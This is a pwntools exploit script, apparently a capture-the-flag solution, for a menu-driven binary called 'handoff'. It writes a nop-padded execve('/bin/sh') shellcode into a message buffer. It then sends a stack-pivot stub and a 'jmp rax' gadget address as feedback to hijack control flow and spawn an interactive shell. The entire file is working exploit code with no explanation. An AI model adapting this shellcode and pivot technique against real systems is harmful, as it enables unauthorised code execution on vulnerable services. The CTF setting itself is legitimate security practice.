#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('handoff')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *vuln+485
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


def init():
    global io

    io = start()


def add_message(name):
    io.sendline(b"1")
    io.sendlineafter(b"name:", name)


def send_message(idx, msg):
    io.sendline(b"2")
    io.sendlineafter(b"?", str(idx).encode())
    io.sendlineafter(b"?", msg)

def trigger(feedback):
    io.sendlineafter(b"\n", b"3")
    io.sendlineafter(b"\n", feedback)


def solve():

    jmp_rax = 0x40116c # jmp rax;

    execve = asm(
        """
            sc:
                nop
                nop
                nop
                nop
                xor rdi, rdi
                lea rdi, [rip+sh]
                xor rsi, rsi
                xor rdx, rdx
                mov eax, 0x3b
                syscall
                nop
                nop
                nop
            
            sh:
                .ascii "/bin/sh"
                .byte 0 
        """
    )

    add_message(asm("nop") * 8)
    send_message(0, execve)

    pivot = asm(
        """
            nop
            nop
            sub rsp, 0x2e4
            nop
            jmp rsp
        """
    )

    trigger(pivot.ljust(20, b"\x90") + p64(jmp_rax))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

